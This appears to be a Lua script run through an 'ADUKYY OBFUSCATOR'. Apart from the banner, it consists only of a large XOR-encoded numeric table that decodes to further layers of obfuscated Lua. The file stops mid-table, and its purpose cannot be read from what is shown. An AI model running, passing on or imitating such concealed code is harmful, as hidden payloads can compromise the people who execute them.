--[[
 РќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРЋЌ   РќѕРќѕРЋЌРќѕРќѕРЋЌ  РќѕРќѕРЋЌРќѕРќѕРЋЌ   РќѕРќѕРЋЌ
РќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЌРќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЌРќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРЋЉ РќѕРќѕРЋћРЋЮРЋџРќѕРќѕРЋЌ РќѕРќѕРЋћРЋЮ
РќѕРќѕРќѕРќѕРќѕРќѕРќѕРЋЉРќѕРќѕРЋЉ  РќѕРќѕРЋЉРќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРќѕРќѕРќѕРЋћРЋЮ  РЋџРќѕРќѕРќѕРќѕРЋћРЋЮ 
РќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЉРќѕРќѕРЋЉ  РќѕРќѕРЋЉРќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРЋћРЋљРќѕРќѕРЋЌ   РЋџРќѕРќѕРЋћРЋЮ  
РќѕРќѕРЋЉ  РќѕРќѕРЋЉРќѕРќѕРќѕРќѕРќѕРќѕРЋћРЋЮРЋџРќѕРќѕРќѕРќѕРќѕРќѕРЋћРЋЮРќѕРќѕРЋЉ  РќѕРќѕРЋЌ   РќѕРќѕРЋЉ   
РЋџРЋљРЋЮ  РЋџРЋљРЋЮРЋџРЋљРЋљРЋљРЋљРЋљРЋЮ  РЋџРЋљРЋљРЋљРЋљРЋљРЋЮ РЋџРЋљРЋЮ  РЋџРЋљРЋЮ   РЋџРЋљРЋЮ   

 РќѕРќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРќѕРќѕРќѕРќѕРќѕРЋЌРќѕРќѕРЋЌ   РќѕРќѕРЋЌРќѕРќѕРќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРќѕРќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРќѕРќѕРќѕРќѕРЋЌ РќѕРќѕРќѕРќѕРќѕРќѕРЋЌ 
РќѕРќѕРЋћРЋљРЋљРЋљРќѕРќѕРЋЌРќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЌРќѕРќѕРЋћРЋљРЋљРЋљРЋљРЋЮРќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРЋћРЋљРЋљРЋљРЋљРЋЮРќѕРќѕРЋћРЋљРЋљРЋљРЋљРЋЮРќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЌРЋџРЋљРЋљРќѕРќѕРЋћРЋљРЋљРЋЮРќѕРќѕРЋћРЋљРЋљРЋљРќѕРќѕРЋЌРќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЌ
РќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРќѕРќѕРќѕРќѕРЋћРЋЮРќѕРќѕРќѕРќѕРќѕРЋЌ  РќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРќѕРќѕРќѕРќѕРќѕРЋЌРќѕРќѕРЋЉ     РќѕРќѕРќѕРќѕРќѕРќѕРќѕРЋЉ   РќѕРќѕРЋЉ   РќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРќѕРќѕРќѕРќѕРЋћРЋЮ
РќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЌРќѕРќѕРЋћРЋљРЋљРЋЮ  РќѕРќѕРЋЉ   РќѕРќѕРЋЉРЋџРЋљРЋљРЋљРЋљРќѕРќѕРЋЉРќѕРќѕРЋЉ     РќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЉ   РќѕРќѕРЋЉ   РќѕРќѕРЋЉ   РќѕРќѕРЋЉРќѕРќѕРЋћРЋљРЋљРќѕРќѕРЋЌ
РЋџРќѕРќѕРќѕРќѕРќѕРќѕРЋћРЋЮРќѕРќѕРќѕРќѕРќѕРќѕРЋћРЋЮРќѕРќѕРЋЉ     РЋџРќѕРќѕРќѕРќѕРќѕРќѕРЋћРЋЮРќѕРќѕРќѕРќѕРќѕРќѕРќѕРЋЉРЋџРќѕРќѕРќѕРќѕРќѕРќѕРЋЌРќѕРќѕРЋЉ  РќѕРќѕРЋЉ   РќѕРќѕРЋЉ   РЋџРќѕРќѕРќѕРќѕРќѕРќѕРЋћРЋЮРќѕРќѕРЋЉ  РќѕРќѕРЋЉ
 РЋџРЋљРЋљРЋљРЋљРЋљРЋЮ РЋџРЋљРЋљРЋљРЋљРЋљРЋЮ РЋџРЋљРЋЮ      РЋџРЋљРЋљРЋљРЋљРЋљРЋЮ РЋџРЋљРЋљРЋљРЋљРЋљРЋљРЋЮ РЋџРЋљРЋљРЋљРЋљРЋљРЋЮРЋџРЋљРЋЮ  РЋџРЋљРЋЮ   РЋџРЋљРЋЮ    РЋџРЋљРЋљРЋљРЋљРЋљРЋЮ РЋџРЋљРЋЮ  РЋџРЋљРЋЮ

        ADUKYY OBFUSCATOR
]]

local iwEWAMGA=53
local ZXpUTNmr={63,89,90,86,84,89,21,121,80,94,86,120,66,109,88,8,7,5,2,63,89,90,86,84,89,21,103,76,69,126,96,76,90,121,8,78,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,4,13,13,25,7,6,12,25,7,1,7,25,7,6,12,25,4,3,13,25,4,2,1,25,4,3,7,25,4,2,5,25,7,1,0,25,4,6,3,25,4,2,5,25,4,13,2,25,4,0,3,25,4,2,5,25,4,13,12,25,4,13,0,25,4,3,3,25,4,2,7,25,4,2,5,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,1,2,25,7,7,2,25,7,0,5,25,7,0,6,25,7,7,2,25,7,0,5,25,7,1,13,25,7,7,2,25,7,0,7,25,7,0,7,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,1,2,25,7,1,2,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,1,25,7,0,5,25,7,0,4,25,7,7,2,25,7,0,1,25,7,0,4,25,7,0,1,25,7,7,2,25,7,0,1,25,7,0,4,25,7,0,0,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,6,25,7,0,5,25,7,0,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,4,12,1,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,6,4,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,7,6,12,25,7,1,7,25,7,6,12,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,4,13,13,25,7,7,0,25,4,6,4,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,4,12,1,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,1,5,25,4,3,5,25,4,13,12,25,4,2,5,25,4,6,3,25,4,13,3,25,4,3,3,25,7,6,12,25,7,1,7,25,7,6,12,25,4,3,13,25,4,2,1,25,4,3,7,25,4,2,5,25,7,1,0,25,4,6,3,25,4,2,5,25,4,13,2,25,4,0,3,25,4,2,5,25,4,13,12,25,4,13,0,25,4,3,3,25,4,2,7,25,4,2,5,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,4,25,7,0,0,25,7,7,2,25,7,0,4,25,7,7,2,25,7,0,6,25,7,0,5,25,7,7,2,25,7,0,1,25,7,0,4,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,0,0,25,7,1,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,1,25,7,0,1,25,7,1,13,25,7,7,2,25,7,1,13,25,7,0,1,25,7,7,2,25,7,1,3,25,7,0,1,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,5,25,7,0,0,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,4,12,1,25,4,12,2,25,4,12,1,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,0,3,25,4,2,7,25,4,13,12,25,4,2,5,25,4,2,5,25,4,3,4,25,4,6,3,25,4,13,3,25,4,3,3,25,7,6,12,25,7,1,7,25,7,6,12,25,4,6,1,25,4,3,4,25,4,13,13,25,4,13,2,25,4,2,1,25,4,3,4,25,4,2,7,25,4,2,5,25,7,7,0,25,4,3,4,25,4,2,5,25,4,13,1,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,6,25,7,0,0,25,7,1,13,25,7,7,2,25,7,0,6,25,7,0,5,25,7,0,5,25,7,7,2,25,7,0,6,25,7,0,7,25,7,1,2,25,7,7,2,25,7,0,6,25,7,0,4,25,7,1,3,25,7,7,2,25,7,0,6,25,7,0,4,25,7,1,3,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,0,5,25,7,1,12,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,1,25,7,0,6,25,7,1,12,25,7,7,2,25,7,1,2,25,7,1,13,25,7,7,2,25,7,0,1,25,7,0,0,25,7,0,1,25,7,7,2,25,7,0,1,25,7,0,6,25,7,0,1,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,1,12,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,4,12,1,25,4,12,2,25,4,0,3,25,4,2,7,25,4,13,12,25,4,2,5,25,4,2,5,25,4,3,4,25,4,6,3,25,4,13,3,25,4,3,3,25,7,7,0,25,4,0,12,25,4,2,1,25,4,13,12,25,4,2,5,25,4,3,4,25,4,13,2,25,7,6,12,25,7,1,7,25,7,6,12,25,4,1,5,25,4,3,5,25,4,13,12,25,4,2,5,25,4,6,3,25,4,13,3,25,4,3,3,25,4,12,1,25,4,12,2,25,4,12,1,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,1,4,25,7,6,12,25,7,1,7,25,7,6,12,25,4,6,1,25,4,3,4,25,4,13,13,25,4,13,2,25,4,2,1,25,4,3,4,25,4,2,7,25,4,2,5,25,7,7,0,25,4,3,4,25,4,2,5,25,4,13,1,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,6,25,7,0,1,25,7,0,4,25,7,7,2,25,7,0,6,25,7,0,7,25,7,0,1,25,7,7,2,25,7,0,6,25,7,0,5,25,7,0,0,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,0,7,25,7,0,0,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,1,13,25,7,0,4,25,7,7,2,25,7,0,1,25,7,0,6,25,7,0,4,25,7,7,2,25,7,1,13,25,7,0,5,25,7,7,2,25,7,1,13,25,7,0,4,25,7,7,2,25,7,1,13,25,7,0,4,25,7,7,2,25,7,1,2,25,7,0,1,25,7,7,2,25,7,1,2,25,7,0,0,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,1,12,25,7,0,6,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,4,12,1,25,4,12,2,25,4,1,4,25,7,7,0,25,4,0,12,25,4,2,1,25,4,13,12,25,4,2,5,25,4,3,4,25,4,13,2,25,7,6,12,25,7,1,7,25,7,6,12,25,4,0,3,25,4,2,7,25,4,13,12,25,4,2,5,25,4,2,5,25,4,3,4,25,4,6,3,25,4,13,3,25,4,3,3,25,4,12,1,25,4,12,2,25,4,1,4,25,7,7,0,25,4,0,3,25,4,3,3,25,4,13,4,25,4,2,5,25,7,6,12,25,7,1,7,25,7,6,12,25,4,0,1,25,4,6,12,25,4,3,3,25,4,3,7,25,7,0,6,25,7,7,0,25,4,3,4,25,4,2,5,25,4,13,1,25,7,6,4,25,7,0,0,25,7,7,2,25,7,6,12,25,7,0,1,25,7,0,5,25,7,0,0,25,7,7,2,25,7,6,12,25,7,0,0,25,7,7,2,25,7,6,12,25,7,0,5,25,7,0,0,25,7,6,5,25,4,12,1,25,4,12,2,25,4,1,4,25,7,7,0,25,4,0,12,25,4,3,5,25,4,13,13,25,4,3,3,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,12,25,7,1,7,25,7,6,12,25,4,0,1,25,4,6,12,25,4,3,3,25,4,3,7,25,7,0,6,25,7,7,0,25,4,3,4,25,4,2,5,25,4,13,1,25,7,6,4,25,7,0,0,25,7,7,0,25,7,0,5,25,7,7,2,25,7,6,12,25,7,7,3,25,7,1,13,25,7,0,5,25,7,7,2,25,7,6,12,25,7,0,0,25,7,7,0,25,7,1,2,25,7,7,2,25,7,6,12,25,7,0,0,25,7,6,5,25,4,12,1,25,4,12,2,25,4,1,4,25,7,7,0,25,4,0,0,25,4,2,5,25,4,13,6,25,4,13,2,25,7,6,12,25,7,1,7,25,7,6,12,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,1,25,7,1,12,25,7,0,7,25,7,7,2,25,7,0,1,25,7,1,13,25,7,0,4,25,7,7,2,25,7,0,1,25,7,1,2,25,7,0,0,25,7,7,2,25,7,0,1,25,7,1,2,25,7,0,7,25,7,7,2,25,7,0,1,25,7,1,12,25,7,1,12,25,7,7,2,25,7,0,1,25,7,1,2,25,7,0,1,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,1,3,25,7,1,3,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,